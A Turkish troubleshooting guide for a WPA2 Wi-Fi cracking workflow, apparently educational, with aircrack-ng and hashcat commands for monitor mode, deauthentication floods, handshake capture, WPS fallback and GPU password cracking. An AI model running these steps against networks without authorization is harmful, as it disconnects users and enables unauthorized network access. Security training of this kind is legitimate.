# 🔧 Sorun Giderme - Troubleshooting

Bu doküman, WPA2 saldırısı sırasında karşılaşılabilecek yaygın problemleri ve çözümlerini içerir.

## İçindekiler

1. [Monitor Mode Sorunları](#monitor-mode-sorunları)
2. [Handshake Yakalama Problemleri](#handshake-yakalama-problemleri)
3. [Deauth Saldırısı Çalışmıyor](#deauth-saldırısı-çalışmıyor)
4. [Aircrack-ng Hataları](#aircrack-ng-hataları)
5. [Sürücü ve Donanım Sorunları](#sürücü-ve-donanım-sorunları)

---

## Monitor Mode Sorunları

### Problem 1: "Monitor mode not supported"

**Hata:**
```
ERROR: Monitor mode not supported by wlan0
```

**Neden:** WiFi kartınız monitor mode desteklemiyor.

**Çözüm:**
```bash
# 1. Chipset'i kontrol edin
lsusb
# veya
airmon-ng

# 2. Sürücü kontrolü
lsmod | grep <driver_name>

# 3. Desteklenen adaptör kullanın:
#    - Alfa AWUS036NHA (Atheros AR9271)
#    - TP-Link TL-WN722N v1 (Atheros AR9271)
#    - Panda PAU09 (Ralink RT5372)
```

> [!TIP]
> **Alfa AWUS036** serisi en güvenilir seçimdir ve Kali Linux'ta "plug and play" çalışır.

---

### Problem 2: Monitor mode etkinleştirilemiyor

**Hata:**
```
ERROR: Failed putting interface wlan0 in monitor mode
```

**Çözüm 1: Servisleri durdur**
```bash
# NetworkManager ve engelleyici servisleri kapat
sudo airmon-ng check kill
```

**Çözüm 2: Manuel mode değişimi**
```bash
# Interface'i kapat
sudo ifconfig wlan0 down

# Monitor mode'a al
sudo iwconfig wlan0 mode monitor

# Interface'i aç
sudo ifconfig wlan0 up

# Kontrol et
iwconfig wlan0
```

**Çözüm 3: Sistemi yeniden başlat**
```bash
sudo reboot
# Bazen en basit çözüm en etkilidir
```

---

### Problem 3: "wlan0mon already exists"

**Hata:**
```
Interface wlan0mon is already in monitor mode
```

**Çözüm:**
```bash
# Mevcut monitor interface'i durdur
sudo airmon-ng stop wlan0mon

# Tekrar başlat
sudo airmon-ng start wlan0
```

---

## Handshake Yakalama Problemleri

### Problem 4: Handshake yakalanmıyor

**Belirti:** `airodump-ng` çalışıyor ama "WPA handshake" mesajı görünmüyor.

**Olası Nedenler ve Çözümler:**

#### Neden 1: Hedef ağda bağlı cihaz yok

**Kontrol:**
```bash
sudo airodump-ng -c <channel> --bssid <BSSID> wlan0mon
```

`STATION` bölümünde bir MAC adresi görüyor musunuz?

**Çözüm:**
- Telefonunuzu veya laptop'unuzu hedefe bağlayın
- Aktif bir cihazın bağlı olduğundan emin olun

#### Neden 2: Yanlış kanal

**Belirti:** Paket sayısı artmıyor (#Data sütunu 0 veya çok düşük)

**Çözüm:**
```bash
# Kanalı doğru belirtin
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon
           ^
           Doğru kanal numarası
```

#### Neden 3: Sinyal gücü zayıf

**Belirti:** PWR değeri < -70 dBm

**Çözüm:**
- Modemin daha yakınına geçin
- Harici anten kullanın
- Engel olmadığından emin olun (duvar, metal vb.)

#### Neden 4: İstemci bağlantıyı yenilemiyor

**Çözüm:** Deauth saldırısı yapın (bkz. Problem 7)

---

### Problem 5: "No valid WPA handshakes found"

**Hata:**
```bash
$ aircrack-ng capture-01.cap
Opening capture-01.cap
Reading packets, please wait...
No valid WPA handshakes found in capture file.
```

**Olası Nedenler:**

#### Neden 1: Handshake eksik (4 mesajın tamamı yakalanmadı)

**Çözüm:**
```bash
# Daha uzun süre dinleyin (10+ dakika)
# Deauth saldırısını tekrarlayın
sudo aireplay-ng --deauth 20 -a <BSSID> -c <CLIENT> wlan0mon
```

#### Neden 2: .cap dosyası bozuk

**Kontrol:**
```bash
# Dosya boyutunu kontrol edin
ls -lh capture-01.cap

# Wireshark ile açın
wireshark capture-01.cap
# Filter: eapol
```

EAPOL paketlerini görebiliyor musunuz?

#### Neden 3: WEP veya açık ağ (WPA değil)

**Kontrol:**
```bash
# Ağın WPA2 olduğundan emin olun
sudo airodump-ng wlan0mon
# ENC sütunu "WPA2" olmalı
```

---

## Deauth Saldırısı Çalışmıyor

### Problem 6: Deauth paketleri gönderilmiyor

**Hata:**
```
00:00:00  Waiting for beacon frame (BSSID: XX:XX:XX:XX:XX:XX) on channel X
```

**Çözüm:**
```bash
# 1. Doğru kanal ve BSSID kullanın
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# 2. Belirli bir istemciyi hedefleyin
sudo aireplay-ng --deauth 10 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# 3. Interface'in monitor mode'da olduğundan emin olun
iwconfig wlan0mon
# Mode:Monitor görmelisiniz
```

---

### Problem 7: Deauth gönderiliyor ama istemci düşmüyor

**Belirti:** `aireplay-ng` "Sending deauth..." diyor ama istemci bağlı kalıyor.

**Olası Nedenler:**

#### Neden 1: WiFi kartı packet injection desteklemiyor

**Test:**
```bash
# Packet injection testi
sudo aireplay-ng --test wlan0mon
```

**Beklenen çıktı:**
```
30/30: 100% (30 packets)
```

Eğer 0/30 görüyorsanız, kartınız packet injection desteklemiyor.

**Çözüm:** Uyumlu bir WiFi adaptörü alın (Alfa AWUS036 serisi önerilir)

#### Neden 2: PMF (Protected Management Frames) aktif

Modern modemler (özellikle WPA3) PMF kullanır ve deauth saldırısına karşı koruma sağlar.

**Belirti:**
- Deauth gönderiliyor
- Modem PMF/MFP destekliyor
- İstemci düşmüyor

**Çözüm:**
```bash
# WPA3 ağlara karşı deauth genellikle işe yaramaz
# Alternatif: Doğal handshake bekleme
# veya WPS saldırısı (Reaver ile)
```

#### Neden 3: Yetersiz güç

**Çözüm:**
```bash
# Transmission power'ı artırın
sudo iw dev wlan0mon set txpower fixed 3000
# (30 dBm = 3000 mBm)

# Maksimum yasal sınır: ülkenize göre değişir
```

> [!WARNING]
> Yüksek güç seviyesi yasal sınırları aşabilir ve cihazınıza zarar verebilir.

---

## Aircrack-ng Hataları

### Problem 8: "ESSID not found"

**Hata:**
```
Please specify an ESSID (-e).
```

**Çözüm:**
```bash
# ESSID'yi manuel belirtin
aircrack-ng -w wordlist.txt -e "MyHomeWiFi" capture-01.cap
```

---

### Problem 9: Çok yavaş kırma hızı

**Belirti:** 100-500 key/saniye gibi düşük hız

**Nedeni:** CPU kullanımı, PBKDF2 hesaplamaları ağır

**Çözümler:**

#### Çözüm 1: Hashcat ile GPU kullanımı
```bash
# cap2hashcat ile dönüştür
hcxpcapngtool -o hash.hc22000 capture-01.cap

# Hashcat ile kır (GPU hızlandırmalı)
hashcat -m 22000 hash.hc22000 wordlist.txt

# Hız: ~100,000+ key/saniye (GPU'ya bağlı)
```

#### Çözüm 2: Wordlist optimizasyonu
```bash
# Küçük liste kullanın
# Örn: Rockyou.txt'den ilk 1 milyon satır
head -n 1000000 /usr/share/wordlists/rockyou.txt > small_list.txt

aircrack-ng -w small_list.txt capture-01.cap
```

#### Çözüm 3: Bulut bilişim
```bash
# AWS, Google Cloud, veya Azure'da yüksek performanslı GPU instance
# HashCat benchmark: Tesla V100 ile ~600,000 key/saniye
```

---

## Sürücü ve Donanım Sorunları

### Problem 10: "SIOCSIFFLAGS: Operation not possible"

**Hata:**
```
SIOCSIFFLAGS: Operation not possible due to RF-kill
```

**Neden:** RF-kill WiFi'yi hardware seviyesinde kapatmış.

**Çözüm:**
```bash
# RF-kill durumunu kontrol et
rfkill list

# WiFi'yi unblock et
sudo rfkill unblock wifi

# Tekrar dene
sudo airmon-ng start wlan0
```

---

### Problem 11: "Could not set channel" hatası

**Hata:**
```
ioctl(SIOCSIWFREQ) failed: Device or resource busy
```

**Çözüm:**
```bash
# Tüm işlemleri öldür
sudo airmon-ng check kill

# Interface'i yeniden başlat
sudo airmon-ng stop wlan0mon
sudo airmon-ng start wlan0
```

---

### Problem 12: USB WiFi kartı tanınmıyor

**Belirti:** `iwconfig` veya `ifconfig` WiFi arayüzü göstermiyor.

**Çözüm:**

#### Adım 1: Cihazın görüldüğünü kontrol et
```bash
lsusb
# Alfa kartı için: "Atheros Communications, Inc." görmeli
```

#### Adım 2: Sürücü yükle
```bash
# Kernel modüllerini kontrol et
lsmod | grep ath

# Eğer boş ise, modülü manuel yükle
sudo modprobe ath9k_htc
```

#### Adım 3: Firmware güncelle
```bash
# Kali Linux'ta
sudo apt update
sudo apt install firmware-atheros

# Sistemi yeniden başlat
sudo reboot
```

---

## İzin (Permission) Hataları

### Problem 13: "Operation not permitted"

**Hata:**
```
nl80211 not found. MAC80211 not installed.
```

**Çözüm:**
```bash
# Tüm komutları sudo ile çalıştırın
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo aireplay-ng --deauth 5 -a <BSSID> wlan0mon
sudo aircrack-ng -w wordlist.txt capture-01.cap
```

---

## Genel Sorun Giderme Kontrol Listesi

```
[ ] WiFi adaptörü takılı ve tanınıyor mu? (lsusb)
[ ] Sürücüler yüklü mü? (lsmod | grep ath/rt)
[ ] Monitor mode aktif mi? (iwconfig - Mode:Monitor)
[ ] Doğru kanal kullanılıyor mu?
[ ] Hedef ağ WPA2-PSK mi? (airodump-ng çıktısı)
[ ] Aktif istemci var mı? (STATION bölümü)
[ ] Deauth paketleri gönderiliyor mu? (aireplay-ng)
[ ] Packet injection çalışıyor mu? (aireplay-ng --test)
[ ] Handshake yakalandı mı? ("WPA handshake" mesajı)
[ ] Wordlist mevcut mu? (ls -lh wordlist.txt)
```

---

## Hata Raporlama ve Yardım Alma

### Logları Toplama

```bash
# Detaylı log
sudo airodump-ng wlan0mon 2>&1 | tee airodump.log

# Sistem bilgileri
uname -a
lsb_release -a
aircrack-ng --version
lsusb
```

### Topluluklar

- **Aircrack-ng Forumu**: https://forum.aircrack-ng.org/
- **Kali Linux Forumları**: https://forums.kali.org/
- **Reddit**: r/Kalilinux, r/AskNetsec

---

**Önemli:** Topluluk desteği alırken **yasal ve etik kullanım** belirtin. "Kendi ağımda test ediyorum" gibi.

---

**İlgili Dokümanlar:**
- [Saldırı Metodolojisi](attack-methodology.md)
- [Teorik Altyapı](theoretical-background.md)
